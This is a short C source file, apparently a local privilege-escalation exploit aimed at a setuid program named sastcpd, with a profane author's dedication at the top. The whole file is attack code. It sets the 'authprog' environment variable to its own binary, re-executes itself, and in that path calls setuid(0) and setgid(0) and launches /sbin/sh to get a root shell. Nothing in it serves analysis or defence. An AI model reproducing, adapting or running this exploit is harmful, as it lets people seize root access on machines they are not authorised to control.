/*
  x-sastcpd.c

  xdeadfed
  To all the shit that has hit my life: "FUCK U I'LL SEE YOU IN HELL!"
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

extern char **environ;

int main(int argc, char **argv) {
  char *env1, *env2;
  char buffer[1024];
  char *vuln;

  vuln = (char *)malloc(256);

  if(argc > 1) {
    snprintf(vuln, 256, "%s", argv[1]);
  }
  else {
    fprintf(stderr, "Usage: %s <path to sastcpd>\n", argv[0]);
    exit(1);
  }

  if((env2 = getenv("HOME")) == NULL) {
    fprintf(stderr, "WHAT!? NO HOME?????\n");
    exit(-1);
  }

  fprintf(stderr, "Setting up the enviroment variable ...");
  snprintf(buffer, 1024, "%s/%s", env2, argv[0]);
  setenv("authprog", buffer, 1);
  fprintf(stderr, "DONE\n");

  if((env1 = getenv("LOCK")) == NULL) {
    fprintf(stderr, "sastcpd exploit by xdeadfed, .sh sux, all in one nice .c\n");
    setenv("LOCK", "xdeadfed", 0);
    execve(argv[0], argv, environ);
  }
  else {
    seteuid(0);
    setuid(0);
    setegid(0);
    setgid(0);
    execl("/sbin/sh", "/sbin/sh", NULL);
  }

  execl(vuln, vuln, NULL);

  return 0;
}
